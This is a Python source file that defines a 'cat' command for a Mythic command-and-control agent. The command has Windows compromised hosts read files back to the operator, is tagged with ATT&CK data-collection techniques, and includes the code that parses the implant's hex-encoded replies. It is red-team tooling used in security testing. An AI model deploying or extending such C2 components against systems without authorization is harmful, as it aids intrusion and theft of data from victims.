from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from .Utils.u import *

class CatArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="file",
                cli_name="file",
                type=ParameterType.String,
                description="File to display",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("file", self.command_line.strip())

class CatCommand(CommandBase):
    cmd = "cat"
    needs_admin = False
    help_cmd = "cat <file>"
    description = "Display file contents"
    version = 1
    author = "@Oblivion"
    attackmapping = ["T1005", "T1039", "T1025"]
    argument_class = CatArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
        builtin=True,
    )

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        task.args.add_arg("action", "cat")
        file_path = task.args.get_arg("file")
        return PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            DisplayParams=f"-file {file_path}",
            CommandName="fs"
        )

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        if not response:
            return PTTaskProcessResponseMessageResponse(
                TaskID=task.Task.ID,
                Success=True
            )
            
        try:
            RawResponse = bytes.fromhex(response)
            Psr = Parser(RawResponse, len(RawResponse))
            output = Psr.Str()
            
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=task.Task.ID,
                Response=output.encode("utf-8", errors="ignore")
            ))

            return PTTaskProcessResponseMessageResponse(
                TaskID=task.Task.ID,
                Success=True
            )

        except Exception as e:
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=task.Task.ID,
                Response=f"Error processing response: {str(e)}".encode('utf-8')
            ))
            return PTTaskProcessResponseMessageResponse(
                TaskID=task.Task.ID,
                Success=False,
                Error=str(e)
            )